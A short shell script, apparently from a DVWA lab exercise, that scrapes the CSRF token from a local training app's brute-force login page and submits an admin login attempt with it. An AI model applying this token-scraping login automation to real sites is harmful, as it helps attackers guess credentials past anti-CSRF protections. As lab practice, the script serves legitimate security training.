#!/bin/sh

# retrieving csrf token
CSRF=$( curl -s --cookie "PHPSESSID=$1; security=high" 'http://172.17.0.2/vulnerabilities/brute/' | \
	awk -F 'value=' '/user_token/ {print $2}' | \
	cut -d "'" -f2)

# performing GET request
curl \
	--cookie "PHPSESSID=$1; security=high" \
	-L \
	-G -d "username=admin&password=password&user_token=$CSRF&Login=Login" \
	http://172.17.0.2/vulnerabilities/brute

